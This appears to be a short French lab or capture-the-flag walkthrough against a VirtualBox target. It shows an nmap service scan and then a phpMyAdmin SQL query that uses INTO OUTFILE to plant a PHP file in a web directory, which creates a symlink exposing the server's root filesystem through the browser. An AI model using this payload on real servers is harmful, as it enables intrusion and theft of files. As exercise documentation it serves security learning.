vie nmap on apprend que le server tourne sur Apache 2.2.22

```bash 
┌──(jdamoise㉿kali)-[~]
└─$ nmap -sV 192.168.56.101
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 10:35 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00057s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http Apache httpd 2.2.22
993/tcp open  ssl/imap Dovecot imapd
MAC Address: 08:00:27:6D:D3:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.99 seconds

```

dans cette version il y a une faille nous premaitant d'acceder a la racine du server via une page sur le navigateur 

via un __symlink("/", "path.php")__ qui est un lien symbolic du __path.php__ vers __/__
on peux acceder au __/__ depuis le navigateur

pour ce faire on execute une injection SQL sur phpmyadmin 

```sql
SELECT 1, '<?php symlink("/", "paths.php");?>' INTO OUTFILE '/var/www/forum/templates_c/run.php';

```

Cette injection vas nous permetre depuis la route /forum/templates_c/run.php

de creer le lien symbolic

il nous reste plus cas acceder a /forum/templates_c/paths.php pour recuperer tout le __/__